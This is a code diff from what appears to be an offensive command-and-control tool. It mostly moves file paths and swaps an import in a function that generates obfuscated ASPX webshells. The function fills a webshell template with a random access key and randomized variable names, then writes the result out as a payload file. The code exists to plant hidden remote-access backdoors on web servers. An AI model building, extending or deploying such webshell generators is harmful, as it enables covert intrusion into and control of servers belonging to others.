@@ -1,7 +1,7 @@
 import requests
 import base64
 import sys
-from Crypto import Random
+import secrets
 import subprocess
 import string
 from core.color import bcolors
@@ -57,10 +57,10 @@ def webshell_execute(webshell, command):
 
 def generate_webshell():
     try:
-        f = open("lib/obf.list")
+        f = open("core/lib/obf.list")
         links = f.read()
         list_full = links.strip().replace("\r", "").split("\n")
-        fp = open('agents/webshell.ninja', 'r')
+        fp = open('core/agents/webshell.ninja', 'r')
         webshell = fp.read()
         KEY = "".join([random.choice(string.ascii_uppercase + string.digits) for i in range(8)]) + "-" + "".join(
             [random.choice(string.ascii_uppercase + string.digits) for i in range(8)]) + "-" + "".join(
@@ -76,11 +76,11 @@ def generate_webshell():
         webshell = webshell.replace('{KEY}', KEY).replace('{VAR1}', VAR1).replace('{VAR2}', VAR2).replace('{VAR3}',
                                                                                                           VAR3).replace(
             '{VAR4}', VAR4)
-        payload = open('payloads/webshell_' + KEY + '.aspx', 'w')
+        payload = open('utils/payloads/webshell_' + KEY + '.aspx', 'w')
         payload.write(webshell)
         payload.close()
         print(
-            "Webshell Generate with key ( " + KEY + " ) and writen in " + 'payloads/webshell_' + KEY + '.aspx' + " : \n" + bcolors.FAIL + webshell + bcolors.ENDC)
+            "Webshell Generate with key ( " + KEY + " ) and writen in " + 'utils/payloads/webshell_' + KEY + '.aspx' + " : \n" + bcolors.FAIL + webshell + bcolors.ENDC)
         return webshell
     except:
         print("Error Generating Webshell ")
